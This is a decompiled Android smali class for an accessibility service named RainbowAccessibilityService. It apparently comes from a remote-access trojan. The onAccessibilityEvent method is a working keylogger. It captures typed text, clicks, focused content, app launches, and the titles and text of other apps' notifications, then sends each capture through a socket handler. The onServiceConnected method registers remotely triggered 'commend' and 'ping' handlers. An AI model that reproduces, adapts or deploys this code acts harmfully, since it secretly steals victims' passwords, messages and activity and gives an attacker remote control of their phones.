.class public final Lcybershieldx/rainbow/RainbowAccessibilityService;
.super Landroid/accessibilityservice/AccessibilityService;
.source "SourceFile"


# instance fields
.field public j:Lc/b;

.field public k:Lb/h;

.field public l:Lb/g;

.field public m:Lb/h;

.field public n:Z


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/accessibilityservice/AccessibilityService;-><init>()V

    return-void
.end method


# virtual methods
.method public final onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 7

    .line 1
    const-string v0, "event"

    .line 2
    .line 3
    invoke-static {p1, v0}, Ll4/h;->i0(Ljava/lang/Object;Ljava/lang/String;)V

    .line 4
    .line 5
    .line 6
    iget-boolean v0, p0, Lcybershieldx/rainbow/RainbowAccessibilityService;->n:Z

    .line 7
    .line 8
    if-eqz v0, :cond_6

    .line 9
    .line 10
    iget-object v0, p0, Lcybershieldx/rainbow/RainbowAccessibilityService;->k:Lb/h;

    .line 11
    .line 12
    if-eqz v0, :cond_5

    .line 13
    .line 14
    const-string v1, "\nNotification : "

    .line 15
    .line 16
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    .line 17
    .line 18
    .line 19
    move-result v2

    .line 20
    const/4 v3, 0x1

    .line 21
    iget-object v0, v0, Lb/h;->a:Lc/b;

    .line 22
    .line 23
    const/16 v4, 0x20

    .line 24
    .line 25
    if-eq v2, v3, :cond_4

    .line 26
    .line 27
    const/16 v3, 0x8

    .line 28
    .line 29
    if-eq v2, v3, :cond_3

    .line 30
    .line 31
    const/16 v3, 0x10

    .line 32
    .line 33
    if-eq v2, v3, :cond_2

    .line 34
    .line 35
    if-eq v2, v4, :cond_1

    .line 36
    .line 37
    const/16 v3, 0x40

    .line 38
    .line 39
    if-eq v2, v3, :cond_0

    .line 40
    .line 41
    goto/16 :goto_2

    .line 42
    .line 43
    :cond_0
    :try_start_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityRecord;->getParcelableData()Landroid/os/Parcelable;

    .line 44
    .line 45
    .line 46
    move-result-object v2

    .line 47
    const-string v3, "null cannot be cast to non-null type android.app.Notification"

    .line 48
    .line 49
    invoke-static {v2, v3}, Ll4/h;->f0(Ljava/lang/Object;Ljava/lang/String;)V

    .line 50
    .line 51
    .line 52
    check-cast v2, Landroid/app/Notification;

    .line 53
    .line 54
    iget-object v3, v2, Landroid/app/Notification;->extras:Landroid/os/Bundle;

    .line 55
    .line 56
    const-string v5, "android.title"

    .line 57
    .line 58
    invoke-virtual {v3, v5}, Landroid/os/Bundle;->getCharSequence(Ljava/lang/String;)Ljava/lang/CharSequence;

    .line 59
    .line 60
    .line 61
    move-result-object v3

    .line 62
    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    .line 63
    .line 64
    .line 65
    move-result-object v3

    .line 66
    iget-object v5, v2, Landroid/app/Notification;->extras:Landroid/os/Bundle;

    .line 67
    .line 68
    const-string v6, "android.text"

    .line 69
    .line 70
    invoke-virtual {v5, v6}, Landroid/os/Bundle;->getCharSequence(Ljava/lang/String;)Ljava/lang/CharSequence;

    .line 71
    .line 72
    .line 73
    move-result-object v5

    .line 74
    invoke-static {v5}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    .line 75
    .line 76
    .line 77
    move-result-object v5

    .line 78
    iget-object v2, v2, Landroid/app/Notification;->extras:Landroid/os/Bundle;

    .line 79
    .line 80
    const-string v6, "android.bigText"

    .line 81
    .line 82
    invoke-virtual {v2, v6}, Landroid/os/Bundle;->getCharSequence(Ljava/lang/String;)Ljava/lang/CharSequence;

    .line 83
    .line 84
    .line 85
    move-result-object v2

    .line 86
    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    .line 87
    .line 88
    .line 89
    move-result-object v2

    .line 90
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    .line 91
    .line 92
    .line 93
    move-result-object p1

    .line 94
    invoke-virtual {p1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 95
    .line 96
    .line 97
    move-result-object p1

    .line 98
    new-instance v6, Ljava/lang/StringBuilder;

    .line 99
    .line 100
    invoke-direct {v6, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 101
    .line 102
    .line 103
    invoke-virtual {v6, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 104
    .line 105
    .line 106
    const-string p1, "\nData : $"

    .line 107
    .line 108
    invoke-virtual {v6, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 109
    .line 110
    .line 111
    invoke-virtual {v6, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 112
    .line 113
    .line 114
    const/16 p1, 0xa

    .line 115
    .line 116
    invoke-virtual {v6, p1}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    .line 117
    .line 118
    .line 119
    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 120
    .line 121
    .line 122
    invoke-virtual {v6, p1}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    .line 123
    .line 124
    .line 125
    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 126
    .line 127
    .line 128
    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    .line 129
    .line 130
    .line 131
    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 132
    .line 133
    .line 134
    move-result-object p1

    .line 135
    invoke-virtual {v0, p1}, Lc/b;->a(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 136
    .line 137
    .line 138
    goto/16 :goto_2

    .line 139
    .line 140
    :cond_1
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    .line 141
    .line 142
    .line 143
    move-result-object p1

    .line 144
    new-instance v1, Ljava/lang/StringBuilder;

    .line 145
    .line 146
    const-string v2, "App : "

    .line 147
    .line 148
    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 149
    .line 150
    .line 151
    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    .line 152
    .line 153
    .line 154
    const-string p1, "\nHas been opened "

    .line 155
    .line 156
    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 157
    .line 158
    .line 159
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 160
    .line 161
    .line 162
    move-result-object p1

    .line 163
    :goto_0
    invoke-virtual {v0, p1}, Lc/b;->a(Ljava/lang/String;)V

    .line 164
    .line 165
    .line 166
    goto :goto_2

    .line 167
    :cond_2
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    .line 168
    .line 169
    .line 170
    move-result-object v1

    .line 171
    invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 172
    .line 173
    .line 174
    move-result-object v1

    .line 175
    new-instance v2, Ljava/lang/StringBuilder;

    .line 176
    .line 177
    const-string v3, "\nIn app : "

    .line 178
    .line 179
    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 180
    .line 181
    .line 182
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    .line 183
    .line 184
    .line 185
    move-result-object p1

    .line 186
    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    .line 187
    .line 188
    .line 189
    const-string p1, "\nTyped : "

    .line 190
    .line 191
    :goto_1
    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 192
    .line 193
    .line 194
    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 195
    .line 196
    .line 197
    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    .line 198
    .line 199
    .line 200
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 201
    .line 202
    .line 203
    move-result-object p1

    .line 204
    goto :goto_0

    .line 205
    :cond_3
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    .line 206
    .line 207
    .line 208
    move-result-object v1

    .line 209
    invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 210
    .line 211
    .line 212
    move-result-object v1

    .line 213
    new-instance v2, Ljava/lang/StringBuilder;

    .line 214
    .line 215
    const-string v3, "\nIn App : "

    .line 216
    .line 217
    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 218
    .line 219
    .line 220
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    .line 221
    .line 222
    .line 223
    move-result-object p1

    .line 224
    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    .line 225
    .line 226
    .line 227
    const-string p1, "\nContent : "

    .line 228
    .line 229
    goto :goto_1

    .line 230
    :cond_4
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    .line 231
    .line 232
    .line 233
    move-result-object v1

    .line 234
    invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 235
    .line 236
    .line 237
    move-result-object v1

    .line 238
    const-string v2, "CLICK"

    .line 239
    .line 240
    invoke-static {v2, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 241
    .line 242
    .line 243
    new-instance v2, Ljava/lang/StringBuilder;

    .line 244
    .line 245
    const-string v3, "\nApp : "

    .line 246
    .line 247
    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 248
    .line 249
    .line 250
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    .line 251
    .line 252
    .line 253
    move-result-object p1

    .line 254
    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    .line 255
    .line 256
    .line 257
    const-string p1, "\nClicked : "

    .line 258
    .line 259
    goto :goto_1

    .line 260
    :cond_5
    const-string p1, "keyloggerHandler"

    .line 261
    .line 262
    invoke-static {p1}, Ll4/h;->x3(Ljava/lang/String;)V

    .line 263
    .line 264
    .line 265
    const/4 p1, 0x0

    .line 266
    throw p1

    .line 267
    :catch_0
    :cond_6
    :goto_2
    return-void
.end method

.method public final onInterrupt()V
    .locals 0

    return-void
.end method

.method public final onServiceConnected()V
    .locals 5

    .line 1
    invoke-super {p0}, Landroid/accessibilityservice/AccessibilityService;->onServiceConnected()V

    .line 2
    .line 3
    .line 4
    new-instance v0, Landroid/content/Intent;

    .line 5
    .line 6
    const-class v1, Lcybershieldx/rainbow/RainbowPermissionActivity;

    .line 7
    .line 8
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 9
    .line 10
    .line 11
    const/high16 v1, 0x10000000

    .line 12
    .line 13
    invoke-virtual {v0, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 14
    .line 15
    .line 16
    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 17
    .line 18
    .line 19
    new-instance v0, Lc/b;

    .line 20
    .line 21
    invoke-direct {v0, p0}, Lc/b;-><init>(Landroid/content/Context;)V

    .line 22
    .line 23
    .line 24
    iput-object v0, p0, Lcybershieldx/rainbow/RainbowAccessibilityService;->j:Lc/b;

    .line 25
    .line 26
    iget-object v0, v0, Lc/b;->a:Ly3/u;

    .line 27
    .line 28
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 29
    .line 30
    .line 31
    new-instance v1, Landroidx/activity/i;

    .line 32
    .line 33
    const/4 v2, 0x7

    .line 34
    invoke-direct {v1, v2, v0}, Landroidx/activity/i;-><init>(ILjava/lang/Object;)V

    .line 35
    .line 36
    .line 37
    invoke-static {v1}, Lf4/b;->a(Ljava/lang/Runnable;)V

    .line 38
    .line 39
    .line 40
    new-instance v0, Lb/g;

    .line 41
    .line 42
    iget-object v1, p0, Lcybershieldx/rainbow/RainbowAccessibilityService;->j:Lc/b;

    .line 43
    .line 44
    const/4 v2, 0x0

    .line 45
    const-string v3, "socket"

    .line 46
    .line 47
    if-eqz v1, :cond_4

    .line 48
    .line 49
    invoke-direct {v0, p0, v1}, Lb/g;-><init>(Landroid/content/Context;Lc/b;)V

    .line 50
    .line 51
    .line 52
    iput-object v0, p0, Lcybershieldx/rainbow/RainbowAccessibilityService;->l:Lb/g;

    .line 53
    .line 54
    new-instance v1, Lb/h;

    .line 55
    .line 56
    iget-object v4, p0, Lcybershieldx/rainbow/RainbowAccessibilityService;->j:Lc/b;

    .line 57
    .line 58
    if-eqz v4, :cond_3

    .line 59
    .line 60
    invoke-direct {v1, v4}, Lb/h;-><init>(Lc/b;)V

    .line 61
    .line 62
    .line 63
    iput-object v1, p0, Lcybershieldx/rainbow/RainbowAccessibilityService;->m:Lb/h;

    .line 64
    .line 65
    new-instance v1, Lb/h;

    .line 66
    .line 67
    if-eqz v4, :cond_2

    .line 68
    .line 69
    invoke-direct {v1, v4}, Lb/h;-><init>(Lc/b;)V

    .line 70
    .line 71
    .line 72
    iput-object v1, p0, Lcybershieldx/rainbow/RainbowAccessibilityService;->k:Lb/h;

    .line 73
    .line 74
    new-instance v1, Lb/d;

    .line 75
    .line 76
    const/4 v3, 0x0

    .line 77
    invoke-direct {v1, v0, v3}, Lb/d;-><init>(Lb/g;I)V

    .line 78
    .line 79
    .line 80
    iget-object v0, v0, Lb/g;->b:Lc/b;

    .line 81
    .line 82
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 83
    .line 84
    .line 85
    new-instance v4, Lc/a;

    .line 86
    .line 87
    invoke-direct {v4, v1}, Lc/a;-><init>(Ls4/c;)V

    .line 88
    .line 89
    .line 90
    iget-object v0, v0, Lc/b;->a:Ly3/u;

    .line 91
    .line 92
    const-string v1, "commend"

    .line 93
    .line 94
    invoke-virtual {v0, v1, v4}, Lz3/c;->c(Ljava/lang/String;Lz3/a;)V

    .line 95
    .line 96
    .line 97
    iget-object v0, p0, Lcybershieldx/rainbow/RainbowAccessibilityService;->l:Lb/g;

    .line 98
    .line 99
    if-eqz v0, :cond_1

    .line 100
    .line 101
    new-instance v1, La/b;

    .line 102
    .line 103
    invoke-direct {v1, v3, p0}, La/b;-><init>(ILjava/lang/Object;)V

    .line 104
    .line 105
    .line 106
    iput-object v1, v0, Lb/g;->e:Ls4/c;

    .line 107
    .line 108
    iget-object v0, p0, Lcybershieldx/rainbow/RainbowAccessibilityService;->m:Lb/h;

    .line 109
    .line 110
    if-eqz v0, :cond_0

    .line 111
    .line 112
    new-instance v1, La/b;

    .line 113
    .line 114
    const/4 v2, 0x1

    .line 115
    invoke-direct {v1, v2, v0}, La/b;-><init>(ILjava/lang/Object;)V

    .line 116
    .line 117
    .line 118
    iget-object v0, v0, Lb/h;->a:Lc/b;

    .line 119
    .line 120
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 121
    .line 122
    .line 123
    new-instance v2, Lc/a;

    .line 124
    .line 125
    invoke-direct {v2, v1}, Lc/a;-><init>(Ls4/c;)V

    .line 126
    .line 127
    .line 128
    iget-object v0, v0, Lc/b;->a:Ly3/u;

    .line 129
    .line 130
    const-string v1, "ping"

    .line 131
    .line 132
    invoke-virtual {v0, v1, v2}, Lz3/c;->c(Ljava/lang/String;Lz3/a;)V

    .line 133
    .line 134
    .line 135
    return-void

    .line 136
    :cond_0
    const-string v0, "pingHandler"

    .line 137
    .line 138
    invoke-static {v0}, Ll4/h;->x3(Ljava/lang/String;)V

    .line 139
    .line 140
    .line 141
    throw v2

    .line 142
    :cond_1
    const-string v0, "commendHandler"

    .line 143
    .line 144
    invoke-static {v0}, Ll4/h;->x3(Ljava/lang/String;)V

    .line 145
    .line 146
    .line 147
    throw v2

    .line 148
    :cond_2
    invoke-static {v3}, Ll4/h;->x3(Ljava/lang/String;)V

    .line 149
    .line 150
    .line 151
    throw v2

    .line 152
    :cond_3
    invoke-static {v3}, Ll4/h;->x3(Ljava/lang/String;)V

    .line 153
    .line 154
    .line 155
    throw v2

    .line 156
    :cond_4
    invoke-static {v3}, Ll4/h;->x3(Ljava/lang/String;)V

    .line 157
    .line 158
    .line 159
    throw v2
.end method
